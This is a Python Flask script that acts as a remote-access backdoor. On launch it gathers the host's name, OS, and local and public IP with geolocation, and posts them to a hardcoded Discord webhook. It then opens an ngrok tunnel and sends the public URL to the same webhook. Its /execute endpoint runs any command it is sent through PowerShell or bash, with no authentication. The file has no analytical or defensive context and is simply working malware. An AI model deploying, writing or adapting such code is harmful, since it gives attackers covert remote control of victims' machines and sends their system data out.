from flask import Flask, request, jsonify
import json
import socket
import os
import platform
import requests
import subprocess
import time
from dhooks import Webhook
import signal
import sys

app = Flask(__name__)

if platform.system() == 'Linux':
    os.system("clear")
else:
    os.system("cls")
username = "swiftfoxerwindows2"  # Default username
hook_url = "https://discord.com/api/webhooks/1283829399132573798/BQYGDwoOEfz7_PC1eSzmqO8BmkbAZwm0RmRgAXTC7Uisq3E4u2w5CMSaxkiF3Jeh0fBM"
hook = Webhook(hook_url)

def start_ngrok():
    ngrok_process = subprocess.Popen(['ngrok', 'http', '8080'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    hook.send("Waiting for ngrok to start...")
    time.sleep(10)

    # Get the public URL using ngrok's API
    try:
        response = requests.get('http://localhost:4040/api/tunnels')
        tunnels = response.json().get('tunnels', [])
        if tunnels:
            public_url = tunnels[0]['public_url']  # Get the first tunnel's public URL
            hook.send(f"Ngrok public URL: {public_url}")
            hook.send(f"```json\n{public_url}\n```")
            return public_url, ngrok_process
        else:
            hook.send("No tunnels found.")
            ngrok_process.terminate()
            return None, ngrok_process
    except Exception as e:
        hook.send(f"Error retrieving public URL: {e}")
        ngrok_process.terminate()
        return None, ngrok_process

# Function to gather system information
def gather_system_info():
    response = requests.get("http://ip-api.com/json/?fields=61439")
    ip_data = response.json()
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)

    public_ip = ip_data.get('query', 'N/A')
    
    system_data = platform.uname()
    system_info = {
        "Node": system_data.node,
        "System": system_data.system,
        "Machine": system_data.machine,
        "Release": system_data.release,
        "Version": system_data.version,
        "Local IP": local_ip
    }
    
    # Send gathered data to Discord
    hook.send(f"```json\n{json.dumps(system_info, indent=4)}\n```")
    hook.send(f"```json\n{json.dumps(ip_data, indent=4)}\n```")
    return public_ip, ip_data, system_info

# Gather and send system information at startup
gather_system_info()

# Start ngrok and get the public URL
ngrok_url, ngrok_process = start_ngrok()
time.sleep(5)

@app.route('/execute', methods=['POST'])
def execute_command():
    data = request.get_json()
    command = data.get('command', '')  # Get the command from the request data
    
    try:
        # Detect OS and choose the appropriate shell for command execution
        if platform.system() == 'Windows':
            # Execute with PowerShell by default
            result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True)
        else:
            # Execute with Bash for Linux/macOS
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        output = result.stdout if result.returncode == 0 else result.stderr
        return jsonify({'result': output})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/update_username', methods=['POST'])
def update_username():
    global username
    new_username = request.json.get('username')
    if new_username:
        username = new_username
        return jsonify({"message": "Username updated", "new_username": username}), 200
    return jsonify({"message": "Username not provided"}), 400

@app.route('/get_username', methods=['GET'])
def get_username():
    return jsonify({"username": username}), 200

def cleanup(signum, frame):
    hook.send("Shutting down gracefully...")
    ngrok_process.terminate()  # Terminate ngrok process
    sys.exit(0)

# Handle SIGINT and SIGTERM for graceful shutdown
signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
